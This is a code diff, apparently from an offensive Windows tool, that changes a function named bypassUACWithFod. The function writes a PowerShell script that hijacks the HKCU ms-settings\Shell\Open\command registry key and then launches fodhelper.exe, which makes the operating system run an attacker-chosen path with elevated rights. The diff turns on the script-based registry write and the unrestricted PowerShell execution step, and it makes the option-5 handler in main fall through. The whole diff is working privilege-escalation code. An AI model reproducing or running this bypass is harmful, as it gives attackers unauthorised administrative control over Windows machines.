@@ -533,7 +533,7 @@ void bypassUACWithFod(TCHAR* dirName) {
 
 	wchar_t line[100] = L"echo [String]$gushellpath = \"";
 	wcscat(line, dirName);
-	wcscat(line, L"\" > inter.ps1");
+	wcscat(line, L" x\" > inter.ps1");
 
 	_wsystem(line);
 	system("echo New-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force >> inter.ps1");
@@ -543,28 +543,28 @@ void bypassUACWithFod(TCHAR* dirName) {
 	memcpy(commandwArgs, dirName, MAX_PATH);
 	wcscat(commandwArgs, L" Balls");
 
-	HKEY key;
-	LSTATUS rv;
-	rv = pRegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, KEY_WRITE, &key);
-	if (rv != ERROR_SUCCESS) {
-		printf("Failed to open key. %d\n", rv);
-	}
+	//HKEY key;
+	//LSTATUS rv;
+	//rv = pRegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, KEY_WRITE, &key);
+	//if (rv != ERROR_SUCCESS) {
+		//printf("Failed to open key. %d\n", rv);
+	//}
 
-	rv = pRegSetValueExW(key, NULL, 0, REG_SZ, (LPBYTE)commandwArgs, (lstrlen(commandwArgs) + 1) * sizeof(TCHAR));
-	if (rv != ERROR_SUCCESS) {
-		printf("Error HEREHERE %d", rv);
-	}
+	//rv = pRegSetValueExW(key, NULL, 0, REG_SZ, (LPBYTE)commandwArgs, (lstrlen(commandwArgs) + 1) * sizeof(TCHAR));
+	//if (rv != ERROR_SUCCESS) {
+		//printf("Error HEREHERE %d", rv);
+	//}
 
 	//pRegCloseKey(key);
 	
-	//system("echo Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value $gushellpath -Force >> inter.ps1");
-	system("echo Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" >> inter.ps1");
+	system("echo Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value $gushellpath -Force >> inter.ps1");
 	
 	wchar_t line2[300] = L"PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
 	wcscat(line2, powerShellPath);
 	wcscat(line2, L"\"");
 
-	//_wsystem(line2);
+	_wsystem(line2);
+
 	system("C:\\Windows\\System32\\fodhelper.exe");
 
 }
@@ -664,7 +664,6 @@ int main(int argc, char* argv[]) {
 
 		if (strcmp(commandOpt, "5") == 0) {
 			bypassUACWithFod(dirName);
-			continue;
 		}
 
 	}
